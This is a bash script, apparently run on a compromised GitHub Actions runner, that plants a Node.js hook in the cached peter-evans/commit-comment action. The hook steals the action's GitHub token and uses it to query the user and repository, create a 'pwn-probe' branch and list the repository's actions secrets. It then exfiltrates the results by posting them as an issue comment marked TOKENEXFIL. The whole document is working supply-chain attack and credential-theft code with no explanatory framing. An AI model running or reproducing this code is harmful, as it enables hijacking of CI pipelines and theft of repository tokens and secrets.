#!/bin/bash
set -u
echo "RCE-MARKER2 job=$GITHUB_JOB run=$GITHUB_RUN_ID action=$GITHUB_ACTION actor=$GITHUB_ACTOR"
id
uname -a
echo "--- hooking commit-comment action ---"
cat > /tmp/hook.js <<'JSEOF'
const cp = require('child_process');
function sh(cmd){ try { return cp.execSync(cmd, {encoding:'utf8', timeout:60000, shell:'/bin/bash'}); } catch(e) { return 'EXEC_ERR ' + (e.stdout||'') + (e.stderr||'') + ' ' + e.message; } }
try {
  const t = process.env.INPUT_TOKEN || process.env.INPUT_GITHUB_TOKEN || '';
  const act = process.env.GITHUB_ACTION || '?';
  if (!t) { console.log('HOOK_NO_TOKEN act=' + act); }
  else {
    const tok = t.replace(/'/g, "'\\''");
    function api(method, url, data){
      const d = data ? " -H 'Content-Type: application/json' -d '" + data + "'" : '';
      return sh("curl -sS -X " + method + " -w '\\nHTTP:%{http_code}' -H 'Authorization: Bearer " + tok + "' -H 'User-Agent: omp'" + d + " '" + url + "'").slice(0,1500);
    }
    const out = [];
    out.push('ACT=' + act + ' LEN=' + t.length);
    out.push('USER=' + api('GET','https://api.github.com/user'));
    out.push('REPO=' + api('GET','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51'));
    out.push('REFS=' + api('POST','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/git/refs', JSON.stringify({ref:'refs/heads/pwn-probe-'+Date.now(), sha: process.env.GITHUB_SHA})));
    out.push('SECRETS=' + api('GET','https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/actions/secrets'));
    const payload = JSON.stringify({body: 'TOKENEXFIL\n```\n' + out.join('\n\n') + '\n```'});
    const bodyB64 = Buffer.from(payload).toString('base64');
    const post = sh("printf '%s' '" + bodyB64 + "' | base64 -d > /tmp/cbody.json && curl -sS -X POST -w '\\nHTTP:%{http_code}' -H 'Authorization: Bearer " + tok + "' -H 'User-Agent: omp' -H 'Content-Type: application/json' --data-binary @/tmp/cbody.json https://api.github.com/repos/PDFtoMark/triage-bgd-labs-v1605241-0a3e51/issues/3/comments");
    console.log('HOOK_RESULT ' + out.join(' || ').replace(/\n/g,' ').slice(0,4000));
    console.log('HOOK_POST ' + String(post).slice(0,600));
  }
} catch(e) { console.log('HOOK_ERR ' + String(e && e.message).slice(0,300)); }
JSEOF
node --check /tmp/hook.js 2>&1 | head -3 || true
for f in /home/runner/work/_actions/peter-evans/commit-comment/*/dist/index.js; do
  [ -f "$f" ] || continue
  grep -q 'tmp/hook.js' "$f" && continue
  { printf 'require("/tmp/hook.js");\n'; cat "$f"; } > /tmp/idx.new && cp /tmp/idx.new "$f" && echo "HOOKED $f"
done
ls -la /home/runner/work/_actions/peter-evans/commit-comment/*/dist/ 2>/dev/null | head -5
echo "--- done ---"
